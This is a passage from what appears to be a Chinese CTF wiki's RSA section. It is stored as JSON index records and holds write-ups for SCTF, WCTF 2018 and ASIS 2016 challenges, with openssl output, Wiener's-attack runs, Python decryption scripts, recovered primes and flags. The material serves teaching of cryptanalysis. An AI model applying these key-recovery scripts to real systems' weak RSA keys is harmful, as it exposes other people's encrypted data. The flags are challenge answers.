50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd: 92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf: 2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22: 28 :66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00: 6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8: 1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc: ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa: 68 :29:6d:66:7c:cf:57:b9:4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN Ej2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm HZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq W7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC 3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7 p2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == -----END PUBLIC KEY----- \u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002 \u279c level2 git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- \u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode d = 29897859398360008828023114464512538800655735360280670512160838259524245332403L with open ( './public.key' ) as f : key = RSA . importKey ( f ) n = key . n e = key . e def getprivatekey ( n , e , d ): priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level3.passwd.enc' ) as f : cipher = f . read () with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) getprivatekey ( n , e , d ) decrypt () \u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32 wIe6ER1s_1TtA3k_e_t00_larg3 \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002 2018 WCTF RSA \u00b6 \u9898\u76ee\u57fa\u672c\u63cf\u8ff0\u4e3a Description: Encrypted message for user \"admin\": <<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>> admin public key: n = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927 e = 65537 Service: http://36.110.234.253 \u8fd9\u4e2a\u9898\u76ee\u73b0\u5728\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u5728\u7ebf\u83b7\u53d6 binary \u4e86\uff0c\u73b0\u5728\u5f97\u5230\u7684 binary \u662f\u4e4b\u524d\u5df2\u7ecf\u4e0b\u8f7d\u597d\u7684\uff0c\u6211\u4eec\u5f53\u65f6\u9700\u8981\u767b\u5f55\u7528\u6237\u7684 admin \u6765\u4e0b\u8f7d\u5bf9\u5e94\u7684 generator\u3002 \u901a\u8fc7\u7b80\u5355\u9006\u5411\u8fd9\u4e2a generator\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u8fd9\u4e48\u5de5\u4f5c\u7684 \u5229\u7528\u7528\u6237\u7ed9\u5b9a\u7684 license\uff0832 \u4e2a\u5b57\u8282\uff09\uff0c\u8fed\u4ee3\u89e3\u5bc6\u67d0\u4e2a \u56fa\u5b9a\u4f4d\u7f6e \u4e4b\u540e\u7684\u6570\u636e\uff0c\u6bcf 32 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u4e0e\u5bc6\u94a5\u76f8\u5f02\u6216\u5f97\u5230\u7ed3\u679c\u3002 \u5bc6\u94a5\u7684\u751f\u6210\u65b9\u6cd5\u4e3a k_1=key k_1=key k_2 =sha256(k_1) k_2 =sha256(k_1) ... k_n=sha256(k_{n-1}) k_n=sha256(k_{n-1}) \u5176\u4e2d\uff0c\u56fa\u5b9a\u4f4d\u7f6e\u5c31\u662f\u5728\u627e\u6e90\u6587\u4ef6 generator \u4e2d\u7b2c\u4e8c\u6b21\u51fa\u73b0 ENCRYPTED \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u6b21\u504f\u79fb 32 \u4e2a\u5b57\u8282\u3002 _ENCRYPT_STR = ENCRYPTED_STR ; v10 = 0 ; ENCRYPTED_LEN = strlen ( ENCRYPTED_STR ); do { do ++ v9 ; while ( strncmp ( & file_contents [ v9 ], _ENCRYPT_STR , ENCRYPTED_LEN ) ); ++ v10 ; } while ( v10 <= 1 ); v11 = & file_start_off_32 [ loc2 + ENCRYPTED_LEN ]; v12 = loc2 + ENCRYPTED_LEN ; len = file_size - ( loc2 + ENCRYPTED_LEN ) - 32 ; decrypt ( & file_start_off_32 [ v12 ], & license , len ); sha256_file_start ( v11 , len , & output ); if ( ! memcmp ( & output , & file_contents [ v12 ], 0x20 u ) ) { v14 = fopen ( \"out.exe\" , \"wb\" ); fwrite ( v11 , 1 u , len , v14 ); fclose ( v14 ); sprintf ( byte_406020 , \"out.exe %s \" , argv [ 1 ]); system ( byte_406020 ); } \u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd\u751f\u6210\u7684\u6587\u4ef6\u7684\u6821\u9a8c\u5bf9\u5e94\u7684\u54c8\u5e0c\u503c\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u503c\uff0c\u7531\u4e8e\u6587\u4ef6\u6700\u540e\u662f\u4e00\u4e2a exe \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6700\u540e\u7684\u6587\u4ef6\u5934\u5c31\u662f\u6807\u51c6\u7684 exe \u6587\u4ef6\uff0c\u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u77e5\u9053\u539f\u59cb\u7684 license \u6587\u4ef6\uff0c\u8fdb\u800c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199 python \u811a\u672c\u751f\u6210 exe\u3002 \u5728\u751f\u6210\u7684 exe \u4e2d\uff0c\u6211\u4eec\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6 license \u4f7f\u7528 license \u4f5c\u4e3a seed \u5206\u522b\u751f\u6210 pq \u5229\u7528 p\uff0cq \u751f\u6210 n\uff0ce\uff0cd\u3002 \u5176\u6f0f\u6d1e\u51fa\u73b0\u5728\u751f\u6210 p\uff0cq \u7684\u65b9\u6cd5\u4e0a\uff0c\u800c\u4e14\u751f\u6210 p \u548c q \u7684\u65b9\u6cd5\u7c7b\u4f3c\u3002 \u6211\u4eec\u5982\u679c\u4ed4\u7ec6\u5206\u6790\u4e0b\u751f\u6210\u7d20\u6570\u7684\u51fd\u6570\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u7d20\u6570\u90fd\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u751f\u6210\u7684 \u751f\u6210\u5de6\u534a\u90e8\u5206 512 \u4f4d\u3002 \u751f\u6210\u53f3\u534a\u90e8\u5206 512 \u4f4d\u3002 \u5de6\u53f3\u6784\u6210 1024 \u6bd4\u7279\u4f4d\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7d20\u6570\uff0c\u662f\u7d20\u6570\u5c31\u6210\u529f\uff0c\u4e0d\u662f\u7d20\u6570\uff0c\u7ee7\u7eed\u751f\u6210\u3002 \u5176\u4e2d\u751f\u6210\u6bcf\u90e8\u5206\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u65b9\u5f0f\u4e3a sha512 ( const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9 ) v9 = r % 1000000007 \u53ea\u6709 v9 \u4f1a\u6709\u6240\u53d8\u5316\uff0c\u4f46\u662f\u5b83\u7684\u8303\u56f4\u5374\u662f\u56fa\u5b9a\u7684\u3002 \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u8868\u793a p\uff0cq \u4e3a p=a*2^{512}+b p=a*2^{512}+b q=c*2^{512}+d q=c*2^{512}+d \u90a3\u4e48 n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd \u90a3\u4e48 n \\equiv bd \\bmod 2^{512} n \\equiv bd \\bmod 2^{512} \u800c\u4e14\u7531\u4e8e p \u548c q \u5728\u751f\u6210\u65f6\uff0ca\uff0cb\uff0cc\uff0cd \u5747\u53ea\u6709 1000000007 \u79cd\u53ef\u80fd\u6027\u3002 \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u6027\uff0c\u9996\u5148\u8ba1\u7b97\u51fa b \u53ef\u80fd\u7684\u96c6\u5408\u4e3a S\uff0c\u540c\u65f6\u6211\u4eec\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u8ba1\u7b97 n/d \\equiv b \\bmod 2^{512} n/d \\equiv b \\bmod 2^{512} \u8fd9\u91cc\u7531\u4e8e b \u548c d \u90fd\u662f p \u7684\u5c3e\u6570\uff0c\u6240\u4ee5\u4e00\u5b9a\u4e0d\u4f1a\u662f 2 \u7684\u500d\u6570\uff0c\u8fdb\u800c\u5fc5\u7136\u5b58\u5728\u9006\u5143\u3002 \u8fd9\u6837\u505a\u867d\u7136\u53ef\u4ee5\uff0c\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7b97\u4e00\u4e0b\u5b58\u50a8\u7a7a\u95f4 64*1000000007 / 1024 / 1024 / 1024=59 64*1000000007 / 1024 / 1024 / 1024=59 \u4e5f\u5c31\u662f\u8bf4\u9700\u8981 59 G\uff0c\u592a\u5927\u4e86\uff0c\uff0c\u6240\u4ee5\u6211\u4eec\u4ecd\u7136\u9700\u8981\u8fdb\u4e00\u6b65\u8003\u8651 n \\equiv bd \\bmod 2^{64} n \\equiv bd \\bmod 2^{64} \u8fd9\u6837\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9700\u6c42\u77ac\u95f4\u5c31\u964d\u5230\u4e86 8 G\u5de6\u53f3\u3002\u6211\u4eec\u4ecd\u7136\u4f7f\u7528\u679a\u4e3e\u7684\u65b9\u6cd5\u8fdb\u884c\u8fd0\u7b97\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 python\uff0c\uff0cpython \u5360\u636e\u7a7a\u95f4\u592a\u5927\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528 c/c++ \u7f16\u5199\u3002 \u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684 d \u8ba1\u7b97\u5bf9\u5e94\u7684\u503c n/d n/d \u5982\u679c\u5bf9\u5e94\u7684\u503c\u5728\u96c6\u5408 S \u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u627e\u5230\u4e86\u4e00\u5bf9\u5408\u6cd5\u7684 b \u548c d\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u6062\u590d p \u548c q \u7684\u4e00\u534a\u3002 \u4e4b\u540e\uff0c\u6211\u4eec\u6839\u636e n-bd=ac*2^{1024}+(ad+bc)*2^{512} n-bd=ac*2^{1024}+(ad+bc)*2^{512} \u53ef\u4ee5\u5f97\u5230 \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa a \u548c c\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u5168\u6062\u590d\u51fa p \u548c q\u3002 \u5728\u5177\u4f53\u6c42\u89e3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5728\u6c42 p \u548c q \u7684\u4e00\u90e8\u5206\u65f6\uff0c\u53ef\u4ee5\u53d1\u73b0\u56e0\u4e3a\u662f\u6a21 2^{64} 2^{64} \uff0c\u6240\u4ee5\u53ef\u80fd\u5b58\u5728\u78b0\u649e\uff08\u4f46\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u662f p\uff0c\u53e6\u5916\u4e00\u4e2a\u662fq\uff0c\u6070\u597d\u5bf9\u79f0\u3002\uff09\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 b \u5bf9\u5e94\u7684 v9\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u679a\u4e3e\u51fa\u6765\u7684\u7a7a\u95f4\u5927\u7ea6\u5360\u7528 11 \u4e2a G\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u6240\u4ee5\u8bf7\u9009\u62e9\u5408\u9002\u7684\u4f4d\u7f6e\u3002 b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137 search 23000000 search 32000000 search 2b000000 search d000000 search 3a000000 search 1c000000 search 6000000 search 24000000 search 15000000 search 33000000 search 2c000000 search e000000 b64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175 search 1d000000 search 3b000000 search 7000000 search 16000000 search 25000000 search 34000000 \u5176\u5b9e\uff0c\u6211\u4eec\u5728\u771f\u6b63\u5f97\u5230 p \u6216\u8005 q \u7684\u4e00\u90e8\u5206\u540e\uff0c\u53e6\u5916\u4e00\u90e8\u5206\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u679a\u4e3e\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u56e0\u4e3a\u8ba1\u7b97\u91cf\u51e0\u4e4e\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6700\u540e\u7ed3\u679c\u4e3a ... hash 7000000 hash 30000000 p = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869 q = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283 plain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 hash 16000000 hash 25000000 hash b000000 hash 34000000 hash 1 a000000 ... \u279c 2018 - WCTF - rsa git :( master ) \u2717 python Python 2.7 . 14 ( default , Mar 22 2018 , 14 : 43 : 05 ) [ GCC 4.2 . 1 Compatible Apple LLVM 9.0 . 0 ( clang - 900.0 . 39.2 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> p = 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 >>> hex ( p )[ 2 :] . decode ( 'hex' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\" , line 42 , in hex_decode output = binascii . a2b_hex ( input ) TypeError : Odd - length string >>> hex ( p )[ 2 : - 1 ] . decode ( 'hex' ) 'flag{fa6778724ed740396fc001b198f30313}' \u6700\u540e\u6211\u4eec\u4fbf\u62ff\u5230 flag \u4e86\u3002 \u8be6\u7ec6\u7684\u5229\u7528\u4ee3\u7801\u8bf7\u53c2\u89c1 ctf-challenge \u4ed3\u5e93\u3002 \u76f8\u5173\u7f16\u8bd1\u6307\u4ee4\uff0c\u9700\u8981\u94fe\u63a5\u76f8\u5173\u7684\u5e93\u3002 g++ exp2.cpp -std = c++11 -o main2 -lgmp -lcrypto -pthread \u53c2\u8003 \u00b6 https://upbhack.de/posts/wctf-2018-writeup-rsa/","title":"\u7efc\u5408"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa","text":"","title":"RSA \u590d\u6742\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2016-asis-find-the-flag","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002 \u279c RSA openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20 :61:b9 Exponent: 12405943493775545863 ( 0xac2ac3e0ca0f5607 ) Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9 \u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a N N \uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002 p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 \u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 flag = open ( 'flag' , 'r' ) . read () * 30 def ext_rsa_encrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) pubkey = RSA . construct (( long ( n ), long ( e ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) return enc except : p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) f = open ( 'pubkey.pem' , 'w' ) f . write ( pubkey . exportKey ()) g = open ( 'flag.enc' , 'w' ) g . write ( ext_rsa_encrypt ( p , q , e , flag )) \u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6 p p \u548c q q \uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165 pubkey.pem \uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684 ext_rsa_encrypt \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165 flag.enc \u3002 \u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684 p p \u548c q q \uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002 \u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 def ext_rsa_decrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( privatekey ) de_error = '' enc = key . decrypt ( msg . decode ( 'base64' ), de_error ) return enc except Exception as error : print error p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 n = p * q e = 12405943493775545863 # pubkey = RSA.construct((long(n), long(e))) # f = open('pubkey.pem', 'w') # f.write(pubkey.exportKey()) g = open ( 'flag.enc' , 'r' ) msg = g . read () flag = ext_rsa_decrypt ( p , q , e , msg ) print flag \u62ff\u5230 flag ASIS{F4ct0R__N_by_it3rat!ng!}","title":"2016 ASIS Find the flag"},{"location":"crypto/asymmetric/rsa/rsa_complex/#sctf-rsa1","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6 \u279c level0 git: ( master ) \u2717 ls -al \u603b\u7528\u91cf 4 drwxrwxrwx 1 root root 0 7\u6708 30 16 :36 . drwxrwxrwx 1 root root 0 7\u6708 30 16 :34 .. -rwxrwxrwx 1 root root 349 5\u6708 2 2016 level1.passwd.enc -rwxrwxrwx 1 root root 2337 5\u6708 6 2016 level1.zip -rwxrwxrwx 1 root root 451 5\u6708 2 2016 public.key \u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5 \u279c level0 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8: 89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c: 70 :87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c: 5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6: bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8: fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21: ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a: 2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8: 72 :1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5: 16 :36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac: c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7: 31 :56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49: cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69: d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b: 86 :94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20: eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46: b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06: 68 :81 Exponent: 65537 ( 0x10001 ) Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ 1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W k5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe RRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr V/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG ZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo gQIDAQAB -----END PUBLIC KEY----- \u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230 p=250527704258269 q=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 \u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA import gmpy2 from base64 import b64decode p = 250527704258269 q = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 e = 65537 n = p * q def getprivatekey ( n , e , p , q ): phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level1.passwd.enc' ) as f : cipher = f . read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) #getprivatekey(n, e, p, q) decrypt () \u53d1\u73b0\u4e0d\u5bf9 \u279c level0 git: ( master ) \u2717 python exp.py \u4e00\u5806\u4e71\u7801\u3002\u3002 